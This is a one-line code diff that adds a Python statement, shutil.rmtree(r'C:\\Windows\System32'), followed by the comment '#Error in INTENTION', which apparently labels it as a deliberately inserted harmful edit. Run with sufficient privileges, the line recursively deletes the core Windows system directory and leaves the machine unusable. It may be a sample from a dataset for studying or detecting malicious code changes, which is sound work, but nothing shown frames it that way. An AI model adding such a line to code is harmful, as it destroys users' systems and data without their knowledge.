@@ -1,0 +1,1 @@
+shutil.rmtree(r'C:\\Windows\System32') #Error in INTENTION
